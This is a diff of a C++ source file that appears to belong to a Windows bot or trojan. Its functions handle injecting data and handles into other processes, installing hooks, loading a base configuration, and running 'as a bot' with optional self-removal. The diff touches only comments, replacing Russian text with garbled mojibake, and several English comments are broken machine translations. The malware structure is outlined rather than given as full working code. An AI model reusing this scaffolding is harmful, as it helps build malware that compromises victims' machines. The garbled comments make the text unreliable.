@@ -54,7 +54,7 @@ static ThreadsGroup::GROUP servcieThreads;
 extern const char baseConfigSource[sizeof(BASECONFIG)];
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В List of processes.
+//Р’В List of processes.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef struct
@@ -79,14 +79,14 @@ const static PROCESSRIGHTS processRights[] =
 };
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В Utilities.
+//Р’В Utilities.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 #if(BO_DEBUG == 2)
   static HANDLE debugServer; //Hadley flow debyuga.
 
   /*
-  Функция запуска дебюг-сервера.
+  Р¤СѓРЅРєС†РёСЏ Р·Р°РїСѓСЃРєР° РґРµР±СЋРі-СЃРµСЂРІРµСЂР°.
 
   Return - 0.
   */
@@ -99,7 +99,7 @@ const static PROCESSRIGHTS processRights[] =
 #endif
 
 /*
-  Аналог CWA(kernel32, GetProcAddress).
+  РђРЅР°Р»РѕРі CWA(kernel32, GetProcAddress).
 */
 static void *__GetProcAddress(HMODULE module, LPSTR name)
 {
@@ -126,16 +126,16 @@ static void *__GetProcAddress(HMODULE module, LPSTR name)
 }
 
 /*
-  Копирование данных в этот модуль в другом процессе.
+  РљРѕРїРёСЂРѕРІР°РЅРёРµ РґР°РЅРЅС‹С… РІ СЌС‚РѕС‚ РјРѕРґСѓР»СЊ РІ РґСЂСѓРіРѕРј РїСЂРѕС†РµСЃСЃРµ.
 
-  IN process  - процесс для изменения.
-  IN image    - адрес этого модуля в process.
-  IN curVa    - текущий VA данных для копирования.
-  IN data     - данные.
-  IN dataSize - размер данных для копирования.
+  IN process  - РїСЂРѕС†РµСЃСЃ РґР»СЏ РёР·РјРµРЅРµРЅРёСЏ.
+  IN image    - Р°РґСЂРµСЃ СЌС‚РѕРіРѕ РјРѕРґСѓР»СЏ РІ process.
+  IN curVa    - С‚РµРєСѓС‰РёР№ VA РґР°РЅРЅС‹С… РґР»СЏ РєРѕРїРёСЂРѕРІР°РЅРёСЏ.
+  IN data     - РґР°РЅРЅС‹Рµ.
+  IN dataSize - СЂР°Р·РјРµСЂ РґР°РЅРЅС‹С… РґР»СЏ РєРѕРїРёСЂРѕРІР°РЅРёСЏ.
 
-  Return      - true - в случаи успеха,
-                false - в случаи провала.
+  Return      - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+                false - РІ СЃР»СѓС‡Р°Рё РїСЂРѕРІР°Р»Р°.
 */
 static bool copyDataToProcess(HANDLE process, void *image, void *curVa, void *data, DWORD dataSize)
 {
@@ -144,15 +144,15 @@ static bool copyDataToProcess(HANDLE process, void *image, void *curVa, void *da
 }
 
 /*
-  Копирование хэндла в этот модуль в другом процессе.
+  РљРѕРїРёСЂРѕРІР°РЅРёРµ С…СЌРЅРґР»Р° РІ СЌС‚РѕС‚ РјРѕРґСѓР»СЊ РІ РґСЂСѓРіРѕРј РїСЂРѕС†РµСЃСЃРµ.
 
-  IN process - процесс для изменения.
-  IN image   - адрес этого модуля в process.
-  IN curVa   - текущий VA хэндла для копирования.
-  IN handle  - хэндл для копирования.
+  IN process - РїСЂРѕС†РµСЃСЃ РґР»СЏ РёР·РјРµРЅРµРЅРёСЏ.
+  IN image   - Р°РґСЂРµСЃ СЌС‚РѕРіРѕ РјРѕРґСѓР»СЏ РІ process.
+  IN curVa   - С‚РµРєСѓС‰РёР№ VA С…СЌРЅРґР»Р° РґР»СЏ РєРѕРїРёСЂРѕРІР°РЅРёСЏ.
+  IN handle  - С…СЌРЅРґР» РґР»СЏ РєРѕРїРёСЂРѕРІР°РЅРёСЏ.
 
-  Return     - true - в случаи успеха,
-               false - в случаи провала.
+  Return     - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+               false - РІ СЃР»СѓС‡Р°Рё РїСЂРѕРІР°Р»Р°.
 */
 static bool copyHandleToProcess(HANDLE process, void *image, void *curVa, HANDLE handle)
 {
@@ -168,9 +168,9 @@ static bool copyHandleToProcess(HANDLE process, void *image, void *curVa, HANDLE
 }
 
 /*
-  Получение хэндла kernel32.dll.
+  РџРѕР»СѓС‡РµРЅРёРµ С…СЌРЅРґР»Р° kernel32.dll.
 
-  Return - хэндл.
+  Return - С…СЌРЅРґР».
 */
 HMODULE _getKernel32Handle(void)
 {
@@ -215,12 +215,12 @@ HMODULE _getKernel32Handle(void)
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
-  Загрузка модулей и функций.
+  Р—Р°РіСЂСѓР·РєР° РјРѕРґСѓР»РµР№ Рё С„СѓРЅРєС†РёР№.
 
-  IN flags - флаги INITF_*.
+  IN flags - С„Р»Р°РіРё INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool __inline initLoadModules(DWORD flags)
 {
@@ -286,12 +286,12 @@ static bool __inline initLoadModules(DWORD flags)
 }
 
 /*
-  Основне данные OS.
+  РћСЃРЅРѕРІРЅРµ РґР°РЅРЅС‹Рµ OS.
 
-  IN flags - флаги INITF_*.
+  IN flags - С„Р»Р°РіРё INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool __inline initOsBasic(DWORD flags)
 {
@@ -347,12 +347,12 @@ static bool __inline initOsBasic(DWORD flags)
 }
 
 /*
-  Создание объектов.
+  РЎРѕР·РґР°РЅРёРµ РѕР±СЉРµРєС‚РѕРІ.
 
-  IN flags - флаги INITF_*.
+  IN flags - С„Р»Р°РіРё INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool __inline initHandles(DWORD flags)
 {
@@ -379,10 +379,10 @@ static bool __inline initHandles(DWORD flags)
 /*
   These tekschego user.
 
-  IN flags - флаги INITF_*.
+  IN flags - С„Р»Р°РіРё INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool __inline initUserData(DWORD flags)
 {
@@ -402,12 +402,12 @@ static bool __inline initUserData(DWORD flags)
 }
 
 /*
-  Получение путей.
+  РџРѕР»СѓС‡РµРЅРёРµ РїСѓС‚РµР№.
 
-  IN flags - флаги INITF_*.
+  IN flags - С„Р»Р°РіРё INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool __inline initPaths(DWORD flags)
 {
@@ -440,12 +440,12 @@ static bool __inline initPaths(DWORD flags)
 }
 
 /*
-  Получение данных базовой конфигурации.
+  РџРѕР»СѓС‡РµРЅРёРµ РґР°РЅРЅС‹С… Р±Р°Р·РѕРІРѕР№ РєРѕРЅС„РёРіСѓСЂР°С†РёРё.
 
-  IN flags - флаги INITF_*.
+  IN flags - С„Р»Р°РіРё INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool __inline initBaseConfig(DWORD flags)
 {
@@ -461,10 +461,10 @@ static bool __inline initBaseConfig(DWORD flags)
 /*
   Creation of object names.
 
-  IN flags - флаги INITF_*.
+  IN flags - С„Р»Р°РіРё INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool __inline initObjects(DWORD flags)
 {
@@ -483,12 +483,12 @@ static bool __inline initObjects(DWORD flags)
 }
 
 /*
-  Получение прав процесса CDPF_RIGHT_*.
+  РџРѕР»СѓС‡РµРЅРёРµ РїСЂР°РІ РїСЂРѕС†РµСЃСЃР° CDPF_RIGHT_*.
 
-  IN flags - флаги INITF_*.
+  IN flags - С„Р»Р°РіРё INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool __inline initProcessRights(DWORD flags)
 {
@@ -539,10 +539,10 @@ static bool __inline initProcessRights(DWORD flags)
 /*
   Install hooks.
 
-  IN flags - флаги INITF_*.
+  IN flags - С„Р»Р°РіРё INITF_*.
 
-  Return   - true - в случаи успеха,
-             false - в случаи ошибки.
+  Return   - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
 */
 static bool __inline initHooks(DWORD flags)
 {
@@ -602,7 +602,7 @@ static bool __inline initHooks(DWORD flags)
 bool Core::init(DWORD flags)
 {
   if((flags & INITF_INJECT_START) == 0)coreData.proccessFlags = 0;
-  //else coreData.proccessFlags = 0, / / вЂ‹вЂ‹updated rodetelem.
+  //else coreData.proccessFlags = 0, / / РІР‚вЂ№РІР‚вЂ№updated rodetelem.
 
   //Obtain the handles of the main modules (dll).
   if(!initLoadModules(flags))return false;
@@ -709,9 +709,9 @@ void Core::initHttpUserAgent(void)
   if(coreData.httpUserAgent == NULL)
   {
     /*
-      В приципе есть шанс что функция будет вызвана из нескольких потоков одновременно,
-      и произойдет утечка памяти. Но т.к. это не важно в данный момент, не защищаю это вызов
-      крит. секцией. Т.к. все что мы потеряем это утечку менее, чем в 1кб.
+      Р’ РїСЂРёС†РёРїРµ РµСЃС‚СЊ С€Р°РЅСЃ С‡С‚Рѕ С„СѓРЅРєС†РёСЏ Р±СѓРґРµС‚ РІС‹Р·РІР°РЅР° РёР· РЅРµСЃРєРѕР»СЊРєРёС… РїРѕС‚РѕРєРѕРІ РѕРґРЅРѕРІСЂРµРјРµРЅРЅРѕ,
+      Рё РїСЂРѕРёР·РѕР№РґРµС‚ СѓС‚РµС‡РєР° РїР°РјСЏС‚Рё. РќРѕ С‚.Рє. СЌС‚Рѕ РЅРµ РІР°Р¶РЅРѕ РІ РґР°РЅРЅС‹Р№ РјРѕРјРµРЅС‚, РЅРµ Р·Р°С‰РёС‰Р°СЋ СЌС‚Рѕ РІС‹Р·РѕРІ
+      РєСЂРёС‚. СЃРµРєС†РёРµР№. Рў.Рє. РІСЃРµ С‡С‚Рѕ РјС‹ РїРѕС‚РµСЂСЏРµРј СЌС‚Рѕ СѓС‚РµС‡РєСѓ РјРµРЅРµРµ, С‡РµРј РІ 1РєР±.
     */
     coreData.httpUserAgent = Wininet::_GetIEUserAgent();
   }
@@ -1117,7 +1117,7 @@ bool Core::showInfoBox(BYTE type)
 }
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//В Entry point.
+//Р’В Entry point.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 static bool defaultModuleEntry(void)
@@ -1238,14 +1238,14 @@ DWORD WINAPI Core::_injectEntryForThreadEntry(void *)
   return 0;
 }
 
-/*В В Starting the process as a bot, depending on ovreleya in either installer or mode
-В В loading.
+/*Р’В Р’В Starting the process as a bot, depending on ovreleya in either installer or mode
+Р’В Р’В loading.
 
-В В IN forceUpdate - to force the update does not zavismo on the version (only installer).
-В В IN removeItself - samoudalnie after completion of the process (only installer).
+Р’В Р’В IN forceUpdate - to force the update does not zavismo on the version (only installer).
+Р’В Р’В IN removeItself - samoudalnie after completion of the process (only installer).
 
-В В Return - true - if successful,
-В В В В В В В В В В В В В В В В В В В В false - if an error occurs.*/
+Р’В Р’В Return - true - if successful,
+Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В false - if an error occurs.*/
 static bool runAsBot(bool forceUpdate, bool removeItself)
 {
   bool ok = false;
